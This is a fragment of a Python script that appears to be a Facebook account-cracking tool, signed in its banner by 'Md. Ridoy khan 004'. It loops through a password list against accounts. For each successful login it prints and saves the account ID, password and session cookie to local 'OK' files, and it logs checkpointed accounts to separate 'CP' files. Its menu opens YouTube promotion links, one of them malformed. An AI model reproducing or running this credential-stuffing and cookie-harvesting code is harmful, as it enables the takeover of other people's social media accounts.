...
def ud():
    ...
    if opt == '1':
        os.system('xdg-open https://https://youtube.com/@yt--gamer--9995')
        FD()
        return None
...
def o():
    ...
    if opt == '1':
        i()
    if opt == '2':
        os.system('xdg-open https://@yofnxncmcwjrclgpgcchfivk428327')
        return None
    if opt == '3':
        os.system('xdg-open https://https://youtube.com/@yt--gamer--9995')
        return None
...
\033[1;32m║AUTHOR    : Md. Ridoy khan 004  ║║ \x1b[1;91m┃╰━╯┣╮┃┃╰━━┫╰━╯┣╯┃┃╰╯\033[1;32m  ║
\033[1;32m║══════════════════════════════════║║  \x1b[1;93m┃╭╮╭╯┃┃┃╭━━┻━━╮┃╱┃┃\033[1;32m   ║
...
\033[1;32m║══════════════════════════════════════════════════════════╗
\033[1;32m║FACEBOOK : Md. Ridoy khab 004  ║ Ummmmaaaaaahh
\033[1;32m║══════════════════════════════════════════════════════════║
\033[1;32m║FB PAGE :  It's Ridoy            ║ Md.Ridoy khan 004
\033[1;32m╚══════════════════════════════════════════════════════════╝\033[1;37m\n""")
loop = 0
oks = []
cps = []
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('    \033[1;32m[RIDOY-004-OK]  ' +cid+ ' | ' +ps+    '  \n \033[1;33mCookie = \033[1;32m'+coki+  ' \n '+pro+'  \033[0;97m')
                cek_apk(session,coki)
                open('/sdcard/RIDOY-004-OK.txt', 'a').write( cid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('    \33[1;30m[RIDOY-004-CP] ' +cid+ ' | ' +ps+           '  \33[0;97m')
                open('/sdcard/RIDOY-004-CP.txt', 'a').write( cid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(' %s[RIDOY-004] [%s/%s]  OK:- %s  CP:- %s \r'%(H,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
    except:
        pass
